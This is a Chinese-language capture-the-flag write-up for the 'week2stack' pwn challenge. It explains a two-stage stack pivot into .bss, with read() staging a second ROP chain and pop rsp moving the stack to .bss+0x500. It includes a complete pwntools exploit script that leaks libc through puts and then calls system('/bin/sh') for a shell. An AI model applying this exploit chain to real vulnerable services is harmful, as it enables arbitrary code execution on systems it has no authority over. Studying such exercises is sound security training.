# week2stack

## 题目简述

程序允许通过连续两次函数尾声把栈迁移到 `.bss`，但初始落点 `0x4040a0` 太靠近 GOT、IO 指针和不可写映射，`puts()` 的深栈调用会破坏关键数据或越界。解法先在浅栈上调用 `read()`，把真正 ROP 链写到 `.bss+0x500`，再用 `pop rsp` 二次迁移到安全区域。

## 解题过程

关键地址如下：

```text
bss            = 0x4040a0
pop rsp ; ...  = 0x40128d
pop rsi ; ...  = 0x401291
pop rdi ; ret  = 0x401293
```

程序已有的两次 `leave` 负责把栈送到初始 `.bss` 链。初始链只执行栈占用较小的 `read(0, bss+0x500, size)`；题目执行流中已有足够大的 `rdx`，所以只需控制 `rdi` 和 `rsi`。读入第二条链后，`pop rsp` 把栈顶切到高地址，再安全调用 `puts()` 泄露 libc。

```python
from pwn import *

context.arch = "amd64"
io = process("./main")
elf = ELF("./main", checksec=False)
libc = ELF("./libc-2.23.so", checksec=False)

bss = 0x4040A0
safe_stack = bss + 0x500
main = elf.sym["main"]
puts_plt = elf.plt["puts"]
read_plt = elf.plt["read"]
read_got = elf.got["read"]

pop_rdi = 0x401293
pop_rsi_r15 = 0x401291
pop_rsp = 0x40128D

def first_pivot_chain():
    return flat(
        pop_rdi, 0,
        pop_rsi_r15, safe_stack, 0,
        read_plt,
        pop_rsp, safe_stack,
    )

io.recvline()
io.recvline()
io.send(first_pivot_chain())

io.recvline()
io.send(b"A" * 0x50 + p64(bss - 8))

leak_chain = flat(
    0, 0, 0,
    pop_rdi, read_got,
    puts_plt,
    main,
).ljust(0x58, b"\x00")
io.send(leak_chain)

leaked_read = u64(io.recvline().rstrip(b"\n").ljust(8, b"\x00"))
libc.address = leaked_read - libc.sym["read"]
log.success(f"libc base: {libc.address:#x}")

system = libc.sym["system"]
bin_sh = next(libc.search(b"/bin/sh\x00"))

io.recvline()
io.recvline()
io.send(first_pivot_chain())

io.recvline()
io.send(b"A" * 0x50 + p64(bss - 8))
io.send(flat(0, 0, 0, pop_rdi, bin_sh, system))

io.interactive()
```

## 方法总结

本题不是“能迁移到 `.bss` 就结束”，而是要评估目标地址上下两侧是否有足够可写栈空间。两级迁移分别承担不同任务：程序自带的 `leave` 到初始落点，浅调用 `read()` 搬运长链，再用 `pop rsp` 到 `.bss+0x500` 执行会大量用栈的 `puts/system`。
